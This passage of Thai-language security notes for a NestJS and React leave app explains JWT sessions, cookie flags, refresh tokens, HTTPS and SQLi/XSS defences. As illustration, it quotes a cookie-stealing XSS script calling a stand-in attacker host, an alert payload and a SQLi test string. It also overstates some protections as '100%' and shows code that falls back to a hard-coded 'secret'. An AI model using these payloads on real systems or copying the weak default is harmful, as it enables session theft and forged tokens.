    1. **Instant Revocation (การเพิกถอนสิทธิ์ฉับพลัน):** Pure JWT จะมีจุดอ่อนร้ายแรงประการหนึ่งคือ "เตะผู้ใช้ออกไม่ได้จนกว่า Token จะหมดอายุ" แต่การมี Session ID ทำให้แอดมินหรือระบบสามารถสั่งระงับบัญชี (Ban/Lock) โดยการลบ `currentSessionId` ทิ้งใน DB เพียงเสี้ยววินาทีเพื่อบล็อก Request ของผู้ใช้ที่มี Token นั้นทันที
    2. **Single Active Session (เตะอุปกรณ์เดิมที่ค้างอยู่ออก):** หากผู้ใช้ไปล็อกอินที่อุปกรณ์เครื่องใหม่ ระบบส่วน Backend จะเจน `currentSessionId` ชุดใหม่ไปทับลงตาราง User เสมอ แปลว่า Token ชุดเก่าๆ ทั้งหมด (เช่นถ้าเคยทำมือถือหาย หรือเผลอล็อกอินหน้าคอมร้านเน็ตทิ้งไว้) ที่ยังถือ `sessionId` อันเก่าอยู่นั้น จะกลายเป็นตั๋วขยะ ใช้ยิง API ใดๆ ไม่เข้าอีกต่อไป
    3. **Action-driven Security (ปลอดภัยขั้นสุดเมื่อทำธุรกรรมสำคัญ):** หากเกิดเคส "เปลี่ยนรหัสผ่าน (Reset Password)" หรือโดนแอดมิน "ปรับลดสิทธิ์ Role" โค้ดของระบบเราออกแบบให้วิ่งไปสั่งทำลาย (Nullifying/Force Logout All Devices) ตัว `currentSessionId` เก่าทิ้งทันที แฮกเกอร์ที่แอบอม Token ชุดที่มีสิทธิ์ของเก่าไปก็จะเจาะเข้ามาดึงข้อมูลต่อไม่ได้แล้ว
    4. **Performance Balance (คงประสิทธิภาพความเบาดุจสายลม):** แม้การเช็คความปลอดภัยจะต้องวิ่งไปเทียบ DB ซ้ำ (Hybrid) แต่ Server ค้นเพียงแค่ String UUID บรรทัดเดียว ไม่ได้โยนภาระไปสร้าง Object ยัดลง RAM หรือตู้ Cache เซิร์ฟเวอร์เหมือนพวกเทคโนโลยี Cookie-Session เก่าๆ จึงทำให้ระบบเรายังคงสเกลรองรับผู้ใช้หลักแสน (Horizontal Scalability) ได้อย่างไร้ปัญหาคอขวด
- **3.1 JWT_SECRET เอามาจากไหน:** มาจาก Environment Variables โหลดเข้า `ConfigService` (`process.env.JWT_SECRET`)
- **3.2 Entropy:** Secret มีความยาวระดับโปรดักชัน (มากกว่า 256 bits) ป้องกันกระบวนการ Brute-force หา Secret ตรงๆ (Offline HMAC Cracking)
- **3.3 สร้างเมื่อไหร่:** สร้างเมื่อ Login ผ่าน หรือ Verify 2FA สำเร็จ (`token.service.ts`)
- **3.4 สร้างฝั่งไหน (FE/BE):** **ต้องสร้างที่ Backend** เสมอ 
  - *อธิบายเชิงลึก:* Backend เป็นส่วนเดียวที่เข้าถึงกุญแจความลับระดับสูงสุด (JWT_SECRET) การเข้ารหัส (Signing) จึงต้องทำข้างในรั้วจำกัด ถ้าให้ FE เข้าถึงหรือสร้าง Token กุญแจจะฝังอยู่ในเครื่อง Client และ Hacker จะสามารถสร้าง JWT ใหม่พร้อมกำหนด Payload `"role": "ADMIN"` ขึ้นมาเจาะระบบทันที
- **3.5 Algorithm:** ใช้ **HMAC SHA-256 (HS256)** 
  - *อธิบายเชิงลึก (ทำไมต้อง 256-bit และ HS256):* ตัวเลข 256 หมายถึงความยาวของข้อมูลแฮช (Hash Output) ที่มีขนาด 256 bits (หรือ 32 bytes) ซึ่งมีความเป็นไปได้ทางคณิตศาสตร์ถึง $2^{256}$ รูปแบบ เป็นมาตรฐานความปลอดภัยระดับสากลทางวิทยาการเข้ารหัสลับ (Cryptography) ปัจจุบันที่คอมพิวเตอร์ที่เร็วที่สุดในโลกก็ไม่สามารถ Brute-force หรือเดาสุ่มเจอลายเซ็นได้ในชีวิตของเรา
  - *ความเหมาะสมกับแอปพลิเคชัน:* โครงสร้างแบบ **H**MAC คือการใช้กุญแจสมมาตร (Symmetric) หมายถึงใช้กุญแจ `JWT_SECRET` ดอกเดียวกันทั้งตอน "เซ็น (Sign)" และตอน "ตรวจสอบ (Verify)" ซึ่งตอบโจทย์ตัวโปรเจกต์ที่เป็นแطก Architecture แบบเซิร์ฟเวอร์เดี่ยว (Monolith - ก้อนเดียวจบ) เพราะประมวลผลทางคณิตศาสตร์ได้เร็วกว่าอัลกอริทึมเข้ารหัสแบบกุญแจคู่ (Asymmetric แบบ RS256) มหาศาล ทำให้ NestJS ของเราจัดการ Request นับหมื่นต่อวินาทีได้โดยที่ CPU ไม่กระตุก
- **3.6 HS256 vs RS256 (ความแตกต่างและเหตุผลที่เลือกใช้):** 
  - *HS256 (Symmetric Cryptography - กุญแจสมมาตร):* ใช้กุญแจความลับเพียงดอกเดียว (Shared Secret เช่น `JWT_SECRET`) ในการทำทั้ง 2 หน้าที่คือ "สร้างลายเซ็น (Sign)" และ "ตรวจสอบลายเซ็น (Verify)" 
    - **เหมาะใช้ตอนไหน:** เหมาะกับสถาปัตยกรรมแบบรวมศูนย์ (Monolithic) ที่ระบบแอปพลิเคชันไม่มีการแบ่งแยกย่อย ผู้ที่ออกบัตรและตรวจบัตรเป็นคนๆ เดียวกัน
  - *RS256 (Asymmetric Cryptography - กุญแจอสมมาตร):* ใช้ระบบกุญแจคู่ (Key Pair) โดยเซิร์ฟเวอร์กลาง (Auth Server) จะผูกขาดเก็บ **Private Key** ไว้คนเดียวเพื่อใช้ "สร้างลายเซ็น" อย่างเดียว แล้วแจกจ่าย **Public Key** ให้อีกนับร้อยเซิร์ฟเวอร์ลูกข่ายนำไปใช้ "ตรวจสอบ" 
    - **เหมาะใช้ตอนไหน:** เหมาะกับระบบ Microservices สเกลใหญ่ หรือ SSO (เช่น Google Login) ที่มี Service นับสิบตัวคุยกัน การทำแบบนี้จะป้องกันไม่ให้เซิร์ฟเวอร์เครื่องปลายทางหรือใครนำกุญแจไปสร้างตั๋วปลอมเองได้ เพราะ Public Key ใช้แกะอ่านยืนยันได้อย่างเดียวแต่ใช้สร้างลายเซ็นไม่ได้
  - ***ทำไมโปรเจกต์นี้จึงตัดสินใจเลือกใช้ HS256?:***
    1. **สถาปัตยกรรมเป็นแบบ Monolithic Architecture:** Backend ของเรา (NestJS) ควบรวมการทำงานทั้งหมดไว้ในตัวเอง ทั้งระบบยืนยันตัวตน (AuthService) และระบบแอปพลิเคชัน (LeavesService) ควบคุมและอ่านตั๋วจ่ายจบภายในตัว ไม่มีความจำเป็นต้องแชร์กุญแจไปให้เซิร์ฟเวอร์นอกตรวจสอบ
    2. **ประสิทธิภาพและความเร็ว (Performance & Latency):** สมการคณิตศาสตร์สมมาตรของ HS256 ประมวลผลสร้างแฮชลายเซ็นได้ **"เร็วกว่าและกิน CPU น้อยกว่า RS256 อย่างมหาศาล"** ทำให้ระบบรับ Request ได้จำนวนมากกว่า (High Throughput) ในขณะที่เซิร์ฟเวอร์ไม่หน่วง
    3. **ลดความซับซ้อนเชิงโครงสร้าง (Simplicity):** การใช้ RS256 ต้องวางโครงสร้างทำ Endpoint แจกจ่าย Public Key (JWKS) ซึ่งมากเกินความจำเป็น การใช้ HS256 เพียงแค่ซ่อน `JWT_SECRET` ให้ปลอดภัยใน Environment Variables (`.env`) ปราศจากการรั่วไหล ก็ปลอดภัยสูงสุดระดับ Production แล้ว
- **3.7 อายุ Access Token:** 
  - *อธิบายเชิงลึก:* Access Token ไม่สามารถลบหรือสั่งยกเลิก (Revoke) ณ ห้วงเวลาทันทีได้ (เว้นแต่จะใช้ Denylist DB ที่ขัดกับหลัก Stateless) จึงจำเป็นต้องตั้งอายุให้สั้นที่สุดเท่าที่เป็นไปได้ (เช่น 15-30 นาที) เพื่อลด **Window of exposure** (ห้วงเวลาที่ Hacker เอาไปใช้ประโยชน์) ยิ่งหมดอายุไว ระบบยิ่งปลอดภัยสูง

### B4. ส่ง Token
- **4.1 - 4.2 การเก็บอย่างปลอดภัย (Cookie):** **[มี]** 
  - *อธิบายเชิงลึก:* Token ไม่ส่งเข้า Body ให้ FE เอาไปเก็บใน `localStorage` ด้วยตัวเอง (ซึ่งเจาะจงแพ้ภัย XSS 100%)
  - ระบบส่งคืนผ่าน `Set-Cookie` header (`backend/src/auth/auth.controller.ts`)
  - **`HttpOnly=true` (ฟิลเตอร์ป้องกันการขโมยด้วย XSS):** 
    - **คืออะไร?** เป็น Flag คำสั่งความปลอดภัยขั้นเด็ดขาดที่ Server ส่งไปกำชับฝั่ง Browser ว่า *"ห้ามอนุญาตให้คำสั่ง JavaScript ใดๆ บนหน้าเครื่องลูกข่าย (Client-side) เข้าถึงค่า Cookie ก้อนนี้เด็ดขาด"* ทำให้ API ในเบราว์เซอร์อย่าง `document.cookie` ถูกมองข้ามหรือแกล้งทำเป็นว่าไม่มี Cookie ก้อนนี้อยู่
    - **ป้องกันช่องโหว่ได้อย่างไร?** ช่วยสร้างภูมิคุ้มกัน **XSS (Cross-Site Scripting)** ได้อย่างสมบูรณ์แบบร้อยเปอร์เซ็นต์ สมมติกรณีเลวร้ายที่สุดที่หน้าเว็บฝั่ง Frontend เกิดบั๊ก โดนแฮกเกอร์ฝังสคริปต์ดูดข้อมูลอันตรายสำเร็จ (เช่น โค้ดโจรเขียนว่า `<script>fetch('hacker.com/steal?token=' + document.cookie)</script>`) สคริปต์ดังกล่าวก็จะมองไม่เห็น Access Token หรือ Refresh Token ของเราเลย ทำให้แฮกเกอร์ไม่สามารถแอบเอา Token นี้ไปใช้สวมรอยแอคเคาท์เรา (Session Hijacking) จากดาร์กเว็บหรือเครื่องอื่นได้เลย
  - **`Secure=true`**: เบราว์เซอร์จะส่ง Cookie กลับไปให้ Server ต่อเมื่อเชื่อมต่ออยู่บนโพรโทคอลที่มีการเข้ารหัสชั้นสูงอย่าง HTTPS เท่านั้น
  **ตัวอย่างโค้ด Set Cookie: (รวมป้องกัน CSRF แบบ SameSite=Lax ด้วย)**
  ```typescript
  private setAuthCookies(res: Response, accessToken: string, refreshToken: string) {
    const isProduction = process.env.NODE_ENV === 'production';
    res.cookie('jwt', accessToken, {
      httpOnly: true,
      secure: isProduction,
      sameSite: 'lax', // <- ป้องกัน CSRF
      maxAge: 15 * 60 * 1000,
      path: '/',
    });
  }
  ```
- **4.3 วิธีดู Token ใน Client:** ดูกด F12 (Developer Tools) -> ไปแท็บ Application หรือ Storage -> เลือกหมวด Cookies 
- **4.4 Decode Payload:** เลนในหน้า DevTools ให้ก๊อปปี้ค่า Value แล้วไปวางที่เว็บ [jwt.io](https://jwt.io/) โปรแกรมจะแตก Base64Url ให้ออกมาเป็น JSON ทรงอ่านง่าย

### B5. Verify Token
- **5.1 & 5.2 ฟังก์ชัน Verify:** **[มี]** ไฟล์ `backend/src/auth/strategies/jwt.strategy.ts` มีคลาส `JwtStrategy` จัดการผสานกับ AuthGuard ของ Passport ทรงพลังและครอบคลุม
  - *อธิบายเชิงลึก (การทำงานของ `JwtStrategy`):* โค้ดส่วนนี้คือ "ด่านตรวจตั๋ว (Checkpoint)" ที่คอยสกัดทุก Request โดยทำหน้าที่ถึง 3 ขั้นตอน:
    1. **Extractor:** แทนที่จะควานหาจาก Header แบบมาตรฐาน โค้ดเราเขียน Custom Logic `ExtractJwt.fromExtractors(...)` ให้เจาะจงลงไปที่ `request.cookies.jwt` เพื่อดึง Access Token จาก `HttpOnly` Cookie ที่เราเซฟเก็บไว้อย่างปลอดภัยออกมา
    2. **Cryptographic Validation:** ระบบจะอ่าน `JWT_SECRET` จาก `ConfigService` เพื่อทำการยืนยันลายเซ็นบนตั๋วด้วยอัลกอริทึม HMAC คอยคัดกรองขยะหรือของปลอมทิ้งแบบ 100% พร้อมเปิด `ignoreExpiration: false` ซึ่งแปลว่าถ้าเลยอายุไข (Expiry Time) จะโดนปัดทิ้งเตะออกทันที
    3. **Session Matching (Hybrid Stateful):** เมื่อคณิตศาสตร์ผ่าน ฟังก์ชัน `validate(payload)` จะรันต่อ ซึ่งฟังก์ชันนี้จะวิ่งไปเรียก `authService.validateAccessPayload(payload)` เพื่อนำค่า `sessionId` ในตั๋วไปเทียบกับ `currentSessionId` บนฐานข้อมูลจริง ทำให้ระบบดักจับและเตะคนที่โดนแบน (Ban/Revoked) ทิ้งได้ทันที
  **ตัวอย่างโค้ด Validate ด่านตรวจตั๋วจาก `jwt.strategy.ts`:**
  ```typescript
  @Injectable()
  export class JwtStrategy extends PassportStrategy(Strategy, 'jwt') {
    constructor(
      private readonly configService: ConfigService,
      private readonly authService: AuthService, // สำหรับเช็ค Session DB
    ) {
      super({
        jwtFromRequest: ExtractJwt.fromExtractors([
          (request: any) => {
            // ดึงค่า jwt ออกมาจาก HttpOnly Cookie
            const data = request?.cookies?.jwt; 
            if (!data) return null;
            return data;
          },
        ]),
        ignoreExpiration: false, // บังคับว่าถ้าหมดอายุให้เด้งทิ้ง (401) ทันที
        // นำกุญแจสมมาตรความลับออกมา Verify ตามมาตรฐาน HS256
        secretOrKey: configService.get<string>('JWT_SECRET') || 'secret',
      });
    }

    // เมื่อลายเซ็นถูกและไม่หมดอายุ จะเข้าสู่ฟังก์ชันเช็ค Stateful ว่าถูกเตะออกไปรึยัง
    async validate(payload: any) {
      return this.authService.validateAccessPayload(payload);
    }
  }
  ```
- **5.3 Verify ต่างจาก Decode อย่างไร:** 
  - *อธิบายเชิงลึก:* `Decode` เป็นตาน้ำของการเปลี่ยน Base64 ร่างภาษาคอม กลับมาเป็นตัวอักษร JSON โดยไม่มีการยืนยันใดๆ แต่ `Verify` เป็นงานทางคณิตศาสตร์เข้ารหัส (Cryptographic Validation) โดยระบบจะหยิบเนื้อ Header และ Payload ส่งให้ฟังก์ชัน HMAC-SHA256 ทำงานร่วมกับ `JWT_SECRET` ที่มันอมไว้ จากนั้นหยิบผลลัพธ์มาเช็คแบบ Exact Match ชนกับค่า Signature บรรทัดที่ 3 ใน JWT ของ User ถ้าตรงกัน 100% จึงไฟเขียวว่าข้อมูลไม่ได้ถูกแฮกเกอร์ตัดต่อมาระหว่างทาง (Non-repudiation & Integrity)
- **5.4 กรณีหมดอายุ:** ตัว AuthGuard ของ NestJS จะปัดตกระหว่างรอบ Middleware และยิงกลับมาเป็น HTTP Status Code `401 Unauthorized` ในทันที โดยส่วน Logic ชั้นลึกของ Controller จะไม่ถูกรันเลยแม้แต่น้อย 
  - *อธิบายเพิ่มเติม (Mechanism การรับมือ 401 ของ Frontend):* แม้ Access Token จะหมดอายุจน Server ดีดเคาะ 401 กลับมา แต่ระบบแอปพลิเคชันของเรา **ไม่ได้ปล่อยให้ผู้ใช้เจอกับ UX ที่สะดุดจนต้องล็อกอินใหม่** เพราะเรามีกลไก **Refresh Token Mechanism** ประคองรับไว้ เมื่อฝั่ง Frontend (ตัว Axios Interceptor) ได้รหัส 401 มันจะแอบพัก Request ปัจจุบันไว้ชั่วคราว แล้วแอบไปคว้า Refresh Token อายุนาน (ที่อยู่ใน Cookie อีกก้อน) ยิงกลับไปที่ `/auth/refresh` เพื่อออกใบ Access Token ใบใหม่ จากนั้นก็จะนำใบใหม่ไปยิง Request ต่อให้เราอัตโนมัติ (Silent Refresh) ทำให้การใช้งานต่อเนื่องลื่นไหล (Transparent UX) ไม่พังกลางคัน

### B6. Bonus: Refresh token Mechanism
- **6.1 ทำไมต้องใช้ (Why use RT):** 
  - ควบคุมจุดบอดของ Access Token (AT) ที่มีอายุสั้นมาก ถ้าไม่อยากสร้างความรำคาญใจให้ผู้ใช้กรอกรหัสผ่านทุก 15 นาที ระบบจึงนำระบบ Refresh Token (RT) ที่มีอายุยาวเข้ามาผนวก เมื่อ AT หมดอายุ ระบบเบื้องหลังจะสาด RT ไปขอปลดล็อกไขเอา AT ใบใหม่แบบเนียนๆ (Transparent UX) 
  - *ข้อควรระวัง:* สำหรับแอปธนาคารหรือเปราะบางสูงมักปฏิเสธระบบ RT บังคับตายตัวว่าหมด 15 นาทีต้อง Login พิสูจน์ตัวใหม่
- **6.2 การออกแบบและอายุของ Token ในโปรเจกต์:** 
  - กฎ Key Separation - โค้ดมีกุญแจเซ็น `REFRESH_TOKEN_HASH_SECRET` แยกส่วน ไม่พึ่งพา JWT_SECRET เดิม เพื่อทำ Isolate Scope ในกรณีที่กุญแจเส้นหนึ่งรั่วไหล
  - **ระยะเวลาคงอยู่ (TTL):** โค้ดโปรเจกต์เรากำหนดให้ Access Token (ตั๋วเข้าใช้งาน) มีอายุ **15 นาที** (`maxAge: 15 * 60 * 1000`) ส่วน Refresh Token (กุญแจปั๊มตั๋ว) ถูกเซ็ตสเปคให้มีอายุยืนยาวถึง **7 วัน** (`maxAge: 7 * 24 * 60 * 60 * 1000`)
- **6.3 การจัดเก็บที่แยกส่วน (ทำไมถึงมองไม่เห็นใน Application Tab เครื่องมือปกติ):** 
  - *ฝั่ง Browser:* ฝังอยู่ใน `HttpOnly` Cookie ควบคู่กับ Access Token แต่ที่ตอนเปิด F12 ดู Cookie แล้วสังเกตเห็นแต่ชื่อก้อน `jwt` โดดๆ ไม่เห็นก้อนของเพื่อนอย่าง `refreshToken` เป็นเพราะเรื่องของ **การปิดกั้นขอบเขต Path กฎเหล็ก (Cookie Path Restriction)** 
  - **อธิบายเชิงลึก:** ในโค้ด `backend/src/auth/auth.controller.ts` ฟังก์ชัน `res.cookie()` ของเราถูกแบ่งเป็น 2 เส้นทาง:
    - ก้อน `jwt` ผูกไว้กับ `path: '/'` (อนุญาตให้แนบอัตโนมัติไปทุกหนทุกแห่งทั่วเว็บ)
    - ก้อน `refreshToken` **ถูกขังไว้กับ `path: '/auth'`** เท่านั้น! (เบราว์เซอร์จะไม่ยอมโชว์หรือส่งมันออกมาเลย เว้นแต่จะเป็นการยิง Request วิ่งกลับไปที่ `/auth/refresh` ตัว Nginx ถึงจะเห็นก้อนนี้โผล่มา) การทำแบบนี้คือชั้นเชิงความคลีน ป้องกันไม่ให้ส่ง Cookie ก้อนใหญ่พร่ำเพรื่อไปกับทุกการเรียก API ที่ไม่เกี่ยวข้องกัน
  **ตัวอย่างโค้ดยืนยันการตั้งทฤษฎี Cookie Path Control (`auth.controller.ts`):**
  ```typescript
  // Access Token: ติดตัวไปทุกที่ที่เรียกใช้งาน API
  res.cookie('jwt', accessToken, {
    httpOnly: true,
    maxAge: 15 * 60 * 1000, // หมดอายุตีกลับ 401 ใน 15 นาที
    path: '/',
  });

  // Refresh Token: ซ่อนตัวเงียบๆ เรียกใช้เฉพาะตอนฉุกเฉินแลกใหม่
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    maxAge: 7 * 24 * 60 * 60 * 1000, // อยู่ยาว 7 วัน
    path: '/auth', // <- ไฮไลท์การจำกัดพิกัด ทำให้มองจากแท็บ Root หน้าบ้านไม่เห็น!
  });
  ```
  - *ฝั่ง Server:* **[กลไก Token Rotation & DB Hashing]** เมื่อนำ RT ไปแลกตั๋ว ชุดคำสั่งจะ Invalidate ตัวที่ใช้แล้วทิ้งและออกคู่เซ็ตใบใหม่ให้ทันที (Rotation) 
  - นอกจากนี้ ค่าย Token ที่เก็บลง Database (`schema.prisma` -> `refreshToken`) จะนำไปเข้าฟังก์ชันแฮชทางเดียว (`crypto.createHmac('sha256')`) หากฐานข้อมูลโดนยิง Dump ออกไป Hacker ก็ได้รหัส Hash RT เอาไปตั้ง Request ปลอม (Impersonation) ไม่ได้อยู่ดี

---

## 🔒 C. Secure Communication
- **C0. แสดง HTTPS (Cloud Architecture & SSL Termination):** **[มี]**
  - *อธิบายเชิงลึก:* ตัวโปรเจกต์ไม่ได้นำแอปพลิเคชัน Node.js (NestJS) เผชิญหน้ากับอินเทอร์เน็ตสาธารณะตรงๆ แต่เราใช้สถาปัตยกรรมแบบ **Reverse Proxy (ด่านหน้า)** โดยมี Nginx (หรือเช่น Pangolin) ตั้งเฝ้าอยู่ที่สี่แยกพอร์ต 443 เพื่อรับจบหน้าที่เข้ารหัส HTTPS ทั้งหมด 
  - **ข้อดี 3 ประการของการทำ SSL Termination ที่ด่านหน้า:**
    1. **Offloading CPU:** การทำคณิตศาสตร์ถอดรหัส HTTPS กินทรัพยากรซีพียูสูงมาก Nginx ถูกเขียนด้วยภาษา C ระดับล่าง จึงถอดรหัสได้เร็วกว่า Node.js อย่างมหาศาล ทำให้ NestJS ของเราเอาแรงไปโฟกัสแต่งาน Business Logic ได้เต็ม 100%
    2. **Centralized Certificate Management:** องค์กรสามารถโฟกัสจัดการและต่ออายุใบเซอร์ (SSL Certificate จาก Let's Encrypt) ไว้ที่หน้าด่าน Nginx ที่เดียว ไม่ต้องตามไปแปะ Private Key ให้กับทุกๆ Microservice หรือ Container ลูกข่ายหลังบ้าน
    3. **Internal Clear-text (Fast Network):** เมื่อ Nginx ถอดรหัสลับเสร็จแล้ว (SSL Termination) มันจะคุยเชื่อมต่อกับ Node.js พอร์ตหลังบ้าน (เช่น 3000) ด้วยโพรโทคอล HTTP เปล่าๆ ธรรมดา ทำให้แอปทำงานและสื่อสารกันไวปานจรวด
- **C1. About CA (Certificate Authority):**
  - *1.1 CA คือใคร:* คือสถาบันคนกลางระดับสากลที่ได้รับความเชื่อถือจากบรรดา OS/Browser ทั่วโลก (ในแอปเราคือ Let's Encrypt แบบ Automated) ทำหน้าที่ยืนยันว่า Domain นั้นๆ พ่วงติดอยู่กับ Public Key ก้อนนั้นจริงๆ
  - *1.2 CA Signature Algorithm:* อัลกอริทึมที่ CA ใช้รหัสลายเซ็นยืนยันตัวเองแปะลงบนใบเซอร์ มักเป็น `SHA-256 with RSA Encryption` (แฮชด้วย SHA256 แล้วทำ Asymmetric Sign ลงมาด้วย Private Key ของ CA)
  - *1.3 Public Key Algo:* รูปแบบกุญแจที่เราเอาไปให้เขาเซ็นรับรอง (ระบบมักเป็น RSA-2048/4096-bit หรือ ECDSA ยุคใหม่)
  - *1.4 กุญแจเขียว (Padlock):* อธิบายให้ทราบถึงความสามารถในการทำ Data Confidentiality (ใครดักสัญญาณกลางอากาศเจอแต่ขยะ) และ Server Authentication (เราได้เชื่อมตรงกับ Server เป้าหมายแท้จริง ไม่ได้โดนการทำ DNS Spoofing วิ่งพาไปหน้าหลอก)
- **C2. เก็บ Key ไว้ไหน (Where to find it):**
  - **โครงสร้างไฟล์ `acme.json` (โปรเจกต์นี้):** สำหรับโปรเจกต์นี้ที่มีการใช้ระบบจัดการ SSL อัตโนมัติ (Automated Certificate Management Environment - ACME) ผ่านเครื่องมือ (เช่น Traefik Proxy หรือระบบหลังบ้านของ Pangolin) ไฟล์จะถูกแพ็กรวมกันในรูปแบบ JSON ที่พิกัด:
    📍 `/home/nc-user/config/letsencrypt/acme.json`
  - *2.1 Private Key (กุญแจส่วนตัว - ห้ามเผยแพร่):* 
    - กุญแจนี้มีหน้าที่เอาไว้ "ถอดรหัส" ข้อมูลที่ Browser ส่งมา **"เป็นความลับสุดยอดและเป็น Private 100%"**
    - ภายในไฟล์ `acme.json` โค้ดชุดที่เป็น `privateKey` จะถูกเก็บไว้รวมในนั้น ซึ่ง **ไฟล์ `acme.json` นี้จะต้องถูกล็อกสิทธิ์ (Permission) ที่ระดับ 600** ทันที (ให้อ่านได้เฉพาะ User `nc-user` หรือ `root` เท่านั้น) หากเผลอเซ็ตเป็น 644 หรือสิทธิ์อื่น โปรแกรม Proxy จะดีด Error และไม่ยอมทำงาน (Security Fail-safe) เพื่อป้องกันกุญแจหลุด
    - ถ้ากรรมการถามว่า "โค้ดในโปรเจกต์เราอยู่ไหน?" **คำตอบคือ: "ไม่มีและห้ามมีใน Source Code (GitHub / Dockerfile) เด็ดขาดครับ"** สาเหตุที่ใน `docker-compose.yml` และ `frontend/nginx.conf` ของเรามีแค่ `listen 80;` เป็นเพราะเราออกแบบเป็น **Internal Network** ให้ตัว Reverse Proxy ตัวแม่บน Cloud ถือไฟล์ `acme.json` และเป็นคนกางโล่ HTTPS ห่อหุ้มโปรเจกต์เราไว้ทั้งหมดครับ
  - *2.2 Public Key / Certificate (ใบรับรอง - เปิดเผยได้):* 
    - กุญแจนี้มีหน้าที่เอาไว้ "แจก" ให้เบราว์เซอร์ของผู้ใช้งาน (Client) เอาไปใช้เพื่อ "เข้ารหัส" ข้อมูลก่อนส่งมาหาเรา **"เป็น Public และเปิดเผยได้ 100%"** 
    - ภายในไฟล์ `acme.json` เดียวกัน จะมีคีย์ส่วนที่เป็น Certificate (หรือ `certificate`) เก็บอยู่ด้วย ซึ่งตอนทำงาน ด่านหน้าของเราก็จะแกะเฉพาะส่วนนี้นำไปแจกจ่ายให้ทุกคนที่คลิกเข้าเว็บได้นำไปใช้ในขั้นตอน TLS Handshake อย่างเปิดเผยครับ

---

## 🔑 D. Secret Management
- **D1. ไฟล์ ENV:** `backend/.env`
  - 1.1 สิทธิ์ไฟล์: (ถ้าอยู่บน Host Server) จะเป็น 600 หรืออนุโลมสุด 644 ที่ห้ามให้ Group อื่นในคอมขู่เอาไป
  - 1.2 - 1.4: ข้อมูลทั้งหมดอย่าง **Client Secret (Google OAuth)** และ **JWT Secret** เก็บไว้ในค่าตัวแปร .env ล้วนๆ (ผ่าน ConfigModule ของ NestJS) ไม่มีใครหน้าไหนยอมมาพิมพ์ชื่อ String ลับแปะสด (Hardcode) ไว้ใน Source Code.ts แจกจ่ายให้คนอื่นดู
- **D2. Private Key:** นอกเหนือจากเซิร์ซโค้ด จะตั้งสิทธิ์ 600
- **D3. ห้ามขึ้น Git:** 
  - ตรวจไปที่ไฟล์ `.gitignore` จะพบว่ามีการเขียนกฎ `.env` หรือ `.env.*` วางไว้
  - เช็ค `git log` ตั้งแต่ก้อนแรก ไม่บรรจุหลุดข้ามขึ้นไปยัง GitHub เลยแม้แต่น้อย

---

## 🛡️ E. SQLi and XSS
### E1. SQL Injection (SQLi)
- **1.1 เกิดเมื่อไหร่:** เกิดกรณีโค้ดดึงเอาช่อง String จากผู้ใช้มาเรียงต่อ (Concatenation) ด้วยเครื่องหมาย `+` เข้ากับสายอักขระ SQL อย่างง่ายดายเพื่อลงไปยัดใน Database ทำให้เกิดช่องโหว่การเปลี่ยน Logic Execution ของโครงสร้างประโยคนั้นๆ ไปอย่างจัง
- **1.2 & 1.3 การป้องกัน:** **[มี]** 
  - *อธิบายเชิงลึก:* ระบบใช้ **Prisma ORM** ซึ่งขจัดโค้ด SQLi จากพื้นฐานไปเลย (Default Safe) Prisma ทำการซอยฝั่ง SQL ลงเป็น Node และประกอบกันเสร็จสับในลักษณะ **Abstract Syntax Tree (AST)** หรือ Parameterized Query จากนั้นมันจะตีความข้อมูล Input จากเหยื่อว่าเป็นแค่ String Value-data แน่นอน ไม่ยอมรับการแปลงร่างเป็น SQL Execution Operator 
  **ตัวอย่างโครงสร้างที่ป้องกัน SQLi ได้ทันที:**
  ```typescript
  // ใน AuthService
  const user = await this.prisma.user.findUnique({
    where: { email: loginDto.email }, // Prisma จะ Escape ข้อมูลนี้ให้อัตโนมัติ
    include: { role: true },
  });
  ```
- **1.4 การทดสอบ:** พิมพ์ `' OR '1'='1` ใส่ในช่องอีเมล ปรากฏว่าระบบยังยืนหยัด Error ว่า "Invalid Email" หรือ "Invalid credentials" แทนที่มันจะข้ามบรรทัด Validation แบบเว็บยุคเก่า

### E2. Cross-Site Scripting (XSS)
- **2.1 เกิดเมื่อไหร่:** เป็นช่องโหว่ที่แฮกเกอร์ฝัง (Inject) โค้ด JavaScript อันตรายเข้ามาให้รันบนหน้าเว็บของเรา ซึ่ง XSS หลักๆ ที่พบบ่อยมี 2 ประเภท:
  1. **Stored XSS (ฝังลง Database):** พบบ่อยในฟังก์ชันที่มีการพิมพ์ข้อความแล้วบันทึกลงฐานข้อมูล เช่น ช่อง "เหตุผลการลางาน (Reason)" เหยื่ออาจจะพิมพ์ `<script>alert('hack')</script>` พอหัวหน้า (Manager) เข้ามากดเปิดดูใบลา เบราว์เซอร์ของหัวหน้าก็จะแอบรันสคริปต์นี้และอาจจะขโมย Session หรือกดอนุมัติลางานให้เอง!
  2. **Reflected XSS (สะท้อนกลับผ่าน URL):** แฮกเกอร์หลอกให้เหยื่อคลิกลิงก์ที่มี Payload แนบมา เช่น `ourweb.com/search?q=<script>...</script>` ถ้าระบบหลังบ้านรับค่า `q` แล้วเอามาแปะแสดงบนหน้าจอว่า "คุณค้นหาคำว่า..." ทันทีโดยไม่ผ่านการกรอง (Sanitize) โค้ดก็จะถูกรันทันทีบนจอเหยื่อ
- **2.2 & 2.3 การป้องกันทั้ง 2 รูปแบบ:** **[มี 2 ชั้น]**
  - *อธิบายเชิงลึกชั้น React (สกัดตั้งแต่การ Render แสดงผล):* React ใช้อาวุธไม้ตาย **DOM Auto-escaping (Context-aware Encoding)** ทุกข้อมูลที่ถูกแทรกผ่านวงเล็บปีกกา `{data}` (ไม่ว่าจะเป็นข้อมูลจาก Database ในเคส Stored XSS หรือข้อมูลจาก URL แบบ Reflected XSS) React จะทำหน้าที่เปลี่ยน Special Characters เช่น `<` และ `>` ให้กลายเป็น HTML Entities (`&lt;` และ `&gt;`) แบบอัตโนมัติ ซึ่งเบราว์เซอร์รับรู้ว่าหน้าที่ของมันคือแสดงผลเป็นข้อความตัวหนังสือดื้อๆ (Text Node) จึงดับฝันการ Execute JavaScript ของแฮกเกอร์ได้ 100%
